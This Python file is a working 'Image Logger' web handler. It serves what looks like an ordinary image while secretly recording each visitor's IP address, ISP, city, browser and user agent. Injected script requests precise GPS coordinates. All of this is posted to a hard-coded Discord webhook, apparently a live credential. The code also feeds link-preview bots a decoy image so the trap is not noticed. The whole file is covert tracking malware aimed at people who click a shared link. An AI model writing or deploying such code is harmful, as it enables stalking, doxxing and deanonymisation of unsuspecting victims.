from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, os

config = {
    "webhook": "https://discord.com/api/webhooks/1513070091309416478/mCmq_htmollREMDgQ6fKNVGWBsQJs8Wu-Dat-19L4wuYcmHoYh5E_ru96X9cTKS8b7U9",
    "image": "https://eating-made-easy.com/wp-content/uploads/2013/06/113.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```"
            }]
        }, timeout=5)
    except Exception:
        pass

def get_geo_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return data
    except Exception:
        pass
    return {}

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"A link was sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                    }]
                }, timeout=5)
            except Exception:
                pass
        return None

    ping = "@everyone"
    info = get_geo_info(ip)
    
    if not info:
        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "UTC/Unknown", "mobile": False, "proxy": False, "hosting": False}
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        ab = config["antiBot"]
        if ab >= 3:
            return None
        if ab == 2 and not info.get("proxy"):
            ping = ""
        if ab == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)
    
    if coords:
        coord_display = coords.replace(",", ", ")
        maps_link = f"https://www.google.com/maps?q={coords}"
        maps_text = f"[Google Maps]({maps_link})"
        coord_extra = "Precise (GPS)"
    else:
        coord_display = f"{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}"
        maps_text = ""
        coord_extra = "Approximate (IP-based)"

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - Location Captured",
            "color": config["color"],
            "fields": [
                {"name": "Endpoint", "value": f"`{endpoint}`", "inline": False},
                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "ISP / ASN", "value": f"`{info.get('isp', 'Unknown')}` / `{info.get('as', 'Unknown')}`", "inline": True},
                {"name": "Location", "value": f"`{info.get('country', 'Unknown')}`, `{info.get('regionName', 'Unknown')}`, `{info.get('city', 'Unknown')}`", "inline": False},
                {"name": "Coordinates", "value": f"`{coord_display}` ({coord_extra})\n{maps_text}", "inline": False},
                {"name": "Timezone", "value": f"`{info.get('timezone', 'Unknown')}`", "inline": True},
                {"name": "Mobile", "value": f"`{info.get('mobile', 'Unknown')}`", "inline": True},
                {"name": "VPN", "value": f"`{info.get('proxy', 'Unknown')}`", "inline": True},
                {"name": "Bot", "value": f"`{'Possibly' if info.get('hosting') and not info.get('proxy') else info.get('hosting', 'False')}`", "inline": True},
                {"name": "OS", "value": f"`{os_name}`", "inline": True},
                {"name": "Browser", "value": f"`{browser}`", "inline": True},
                {"name": "User Agent", "value": f"```{useragent}```", "inline": False}
            ]
        }]
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except Exception:
        pass
    return info

class handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            s = self.path
            forwarded = self.headers.get('x-forwarded-for', '') or self.headers.get('x-real-ip', '') or '0.0.0.0'
            useragent = self.headers.get('user-agent', '')
            
            if config["imageArgument"]:
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{margin:0;padding:0;}}
div.img {{background-image:url('{url}');background-position:center center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style><div class="img"></div>'''.encode()
            
            if forwarded.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
                return
            
            if botCheck(forwarded, useragent):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))
                makeReport(forwarded, endpoint=s.split("?")[0], url=url)
                return
            
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                except Exception:
                    location = None
                makeReport(forwarded, useragent, location, s.split("?")[0], url=url)
            else:
                makeReport(forwarded, useragent, endpoint=s.split("?")[0], url=url)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            if config["accurateLocation"]:
                data += b"""<script>
(function(){var u=window.location.href;if(u.includes('g='))return;
function c(p){var lat=p.coords.latitude,lon=p.coords.longitude,coords=lat+','+lon,enc=btoa(coords).replace(/=/g,'%3D');
u.includes('?')?window.location.replace(u+'&g='+enc):window.location.replace(u+'?g='+enc)}
if(navigator.geolocation){navigator.geolocation.getCurrentPosition(c,function(){},{enableHighAccuracy:true,timeout:5000,maximumAge:0})
setTimeout(function(){if(!window.location.href.includes('g=')){navigator.geolocation.getCurrentPosition(c,function(){},{enableHighAccuracy:false,timeout:3000,maximumAge:60000})}},100)}
})();</script>"""
            
            self.wfile.write(data)
        
        except Exception:
            try:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body></body></html>')
                reportError(traceback.format_exc())
            except Exception:
                pass
    
    def do_POST(self):
        self.do_GET()
